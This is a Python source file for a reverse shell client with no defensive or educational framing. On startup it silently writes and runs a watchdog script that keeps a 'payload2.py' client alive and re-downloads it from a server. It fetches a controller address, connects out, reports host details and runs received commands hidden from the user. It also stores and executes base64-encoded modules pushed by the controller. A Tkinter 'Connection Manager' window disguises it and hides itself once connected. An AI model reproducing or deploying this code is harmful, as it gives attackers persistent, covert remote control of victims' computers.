import socket
import subprocess
import os
import sys
import platform
import time
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import locale
import base64
import requests

script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)
FAILSAFE_FILENAME = "failsafe.py"
FAILSAFE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), FAILSAFE_FILENAME)

FAILSAFE_CODE = '''
import os
import sys
import time
import subprocess
import requests
import psutil

CLIENT_FILENAME = "payload2.py"
SERVER_URL = "http://127.0.0.1:5000/get_client_code"
CHECK_INTERVAL = 5

def is_client_running():
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if 'python' in proc.info['name'].lower() and CLIENT_FILENAME in ' '.join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def find_client_code():
    script_path = os.path.join(os.getcwd(), CLIENT_FILENAME)
    if os.path.isfile(script_path):
        return script_path
    return None

def download_client_code():
    try:
        response = requests.get(SERVER_URL)
        if response.status_code == 200:
            return response.text
        else:
            print(f"[!] Failed to download client code: {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Error downloading client code: {e}")
        return None

def save_client_code(code, path):
    with open(path, "w", encoding="utf-8") as f:
        f.write(code)

def launch_client(script_path):
    print(f"[+] Launching client: {script_path}")
    subprocess.Popen([sys.executable, script_path])

def main():
    print("[*] Watchdog started.")
    while True:
        if is_client_running():
            print("[*] Client is running. Sleeping.")
            time.sleep(CHECK_INTERVAL)
            continue

        print("[!] Client is NOT running.")
        client_path = find_client_code()
        if client_path:
            print("[*] Client code found. Launching.")
            launch_client(client_path)
        else:
            print("[*] Client code not found. Requesting from server.")
            code = download_client_code()
            if code:
                save_client_code(code, CLIENT_FILENAME)
                print("[*] Client code saved. Launching.")
                launch_client(CLIENT_FILENAME)
            else:
                print("[!] Could not retrieve client code. Will retry.")
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
'''

def deploy_failsafe():
    if not os.path.isfile(FAILSAFE_PATH):
        with open(FAILSAFE_PATH, "w", encoding="utf-8") as f:
            f.write(FAILSAFE_CODE)
    import psutil
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if 'python' in proc.info['name'].lower() and FAILSAFE_FILENAME in ' '.join(proc.info['cmdline']):
                return
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    subprocess.Popen([sys.executable, FAILSAFE_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

deploy_failsafe()

def get_server_info(flask_url):
    try:
        resp = requests.get(flask_url, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            ip = data.get('ip')
            port = data.get('port')
            return ip, port
    except Exception as e:
        print(f"Error fetching server info: {e}")
    return None, None

script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)

class ReverseShellClient:
    def __init__(self):
        self.connected = False
        self.socket = None
        self.BUFFER_SIZE = 4096
        self.DELIMITER = b"<END_OF_MESSAGE>"
        self.system_encoding = locale.getpreferredencoding()
        self.modules_dir = os.path.join(script_dir, "modules")
        os.makedirs(self.modules_dir, exist_ok=True)
        
    def connect(self, host, port):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(15)
            self.socket.connect((host, port))
            self.socket.settimeout(None)
            self.connected = True
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False
    
    def execute_command(self, command):
        command = command.strip()

        if command.startswith("__store_module__ "):
            try:
                parts = command.split(" ", 2)
                if len(parts) < 3:
                    return "[store_module] Usage error"
                modname, b64code = parts[1], parts[2]
                code = base64.b64decode(b64code.encode('utf-8'))
                modpath = os.path.join(self.modules_dir, f"{modname}.py")
                with open(modpath, "wb") as f:
                    f.write(code)
                return f"[store_module] Module '{modname}' stored successfully."
            except Exception as e:
                return f"[store_module] Error: {e}"

        if command.startswith("__run_module__ "):
            try:
                parts = command.split(" ", 1)
                if len(parts) < 2:
                    return "[run_module] Usage error"
                modname = parts[1].strip()
                modpath = os.path.join(self.modules_dir, f"{modname}.py")
                if not os.path.isfile(modpath):
                    return f"[run_module] Module '{modname}' not found."
                import io, contextlib, importlib.util, types

                output = io.StringIO()
                with contextlib.redirect_stdout(output):
                    spec = importlib.util.spec_from_file_location(modname, modpath)
                    module = importlib.util.module_from_spec(spec)
                    sys.modules[modname] = module
                    spec.loader.exec_module(module)
                    if hasattr(module, "run") and callable(module.run):
                        module.run()
                return output.getvalue() or f"[run_module] Module '{modname}' executed (no output)."
            except Exception as e:
                return f"[run_module] Error: {e}"

        if command.startswith("__exec_module__ "):
            code_b64 = command[len("__exec_module__ "):]
            try:
                code = base64.b64decode(code_b64).decode('utf-8')
                exec_globals = {
                    "__builtins__": __builtins__,
                    "os": os, "sys": sys, "socket": socket,
                    "platform": platform, "subprocess": subprocess
                }
                exec_locals = {}
                exec(code, exec_globals, exec_locals)
                return "[Module] Executed successfully."
            except Exception as e:
                return f"[Module] Error: {e}"

        if command.lower().startswith("cd "):
            directory = command[3:].strip()
            try:
                os.chdir(directory)
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"Error changing directory: {str(e)}"
        
        if command.lower() in ["ipconfig", "ifconfig", "ipconfig /all"]:
            if os.name == 'nt':
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                stdout, stderr = process.communicate(timeout=30)
                try:
                    output = stdout.decode(self.system_encoding, errors='replace')
                except:
                    output = stdout.decode('utf-8', errors='replace')
                if stderr:
                    error_output = stderr.decode('utf-8', errors='replace')
                    output += "\n" + error_output
                return output
            else:
                return self._execute_normal_command(command)
        
        return self._execute_normal_command(command)
    
    def _execute_normal_command(self, command):
        try:
            if os.name == 'nt':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                process = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            stdout, stderr = process.communicate(timeout=30)
            output = ""
            if stdout:
                try:
                    output += stdout.decode(self.system_encoding, errors='replace')
                except:
                    output += stdout.decode('utf-8', errors='replace')
            if stderr:
                try:
                    output += stderr.decode(self.system_encoding, errors='replace')
                except:
                    output += stderr.decode('utf-8', errors='replace')
            if not output:
                output = f"Command '{command}' executed (no output)"
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def system_info(self):
        try:
            username = os.getlogin()
        except Exception:
            username = "unknown"
        info = f"""
System Information:
------------------
Hostname: {platform.node()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Architecture: {platform.machine()}
Username: {username}
Current Path: {os.getcwd()}
System Encoding: {self.system_encoding}
"""
        return info
    
    def run_shell(self):
        if not self.connected:
            return
        try:
            self.send_output(self.system_info())
            while self.connected:
                command = self.receive_data()
                if not command:
                    break
                response = self.execute_command(command)
                self.send_output(response)
        except Exception as e:
            print(f"Shell error: {e}")
        finally:
            if self.socket:
                self.socket.close()
            self.connected = False
    
    def send_output(self, output):
        try:
            data = output.encode('utf-8', errors='replace') + self.DELIMITER
            self.socket.sendall(data)
        except Exception as e:
            print(f"Send error: {e}")
            self.connected = False
    
    def receive_data(self):
        try:
            data = b""
            while self.connected:
                chunk = self.socket.recv(self.BUFFER_SIZE)
                if not chunk:
                    self.connected = False
                    return None
                data += chunk
                if self.DELIMITER in data:
                    return data.split(self.DELIMITER)[0].decode('utf-8', errors='replace')
        except Exception as e:
            print(f"Receive error: {e}")
            self.connected = False
            return None

class SimpleConnectionGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Connection Manager")
        self.root.geometry("400x250")
        self.shell_client = ReverseShellClient()
        self.create_widgets()
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        ttk.Label(main_frame, text="Connection Type:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.conn_type = tk.StringVar(value="direct")
        conn_frame = ttk.Frame(main_frame)
        conn_frame.grid(row=0, column=1, sticky=tk.W, pady=5)
        ttk.Radiobutton(conn_frame, text="Direct IP", variable=self.conn_type, value="direct").pack(side=tk.LEFT)
        ttk.Radiobutton(conn_frame, text="Ngrok", variable=self.conn_type, value="ngrok").pack(side=tk.LEFT)
        ttk.Label(main_frame, text="Host / Ngrok URL:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.host_entry = ttk.Entry(main_frame, width=30)
        self.host_entry.grid(row=1, column=1, sticky=tk.W, pady=5)
        ttk.Label(main_frame, text="Port:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.port_entry = ttk.Entry(main_frame, width=10)
        self.port_entry.grid(row=2, column=1, sticky=tk.W, pady=5)
        self.status_label = ttk.Label(main_frame, text="", foreground="blue")
        self.status_label.grid(row=3, column=0, columnspan=2, pady=10)
        connect_btn = ttk.Button(main_frame, text="Connect", command=self.connect)
        connect_btn.grid(row=4, column=0, columnspan=2, pady=10)
    
    def connect(self):
        host = self.host_entry.get().strip()
        port = self.port_entry.get().strip()
        if not host or not port.isdigit():
            messagebox.showerror("Error", "Please enter valid host and port.")
            return
        port = int(port)
        self.status_label.config(text="Connecting...")
        self.root.update()
        thread = threading.Thread(target=self._do_connect, args=(host, port), daemon=True)
        thread.start()
    
    def _do_connect(self, host, port):
        success = self.shell_client.connect(host, port)
        if success:
            self.status_label.config(text="Connected! Shell running...")
            self.root.update()
            self.root.withdraw()
            shell_thread = threading.Thread(target=self.shell_client.run_shell, daemon=True)
            shell_thread.start()
        else:
            self.status_label.config(text="Connection failed.")

def main():
    flask_url = "https://example.com/get_target"
    ip, port = get_server_info(flask_url)
    if ip and port:
        print(f"[+] Connecting to {ip}:{port}")
        client = ReverseShellClient()
        if client.connect(ip, int(port)):
            client.run_shell()
        else:
            print("Connection failed.")
    else:
        print("Could not get target info from server.")

if __name__ == "__main__":
    main()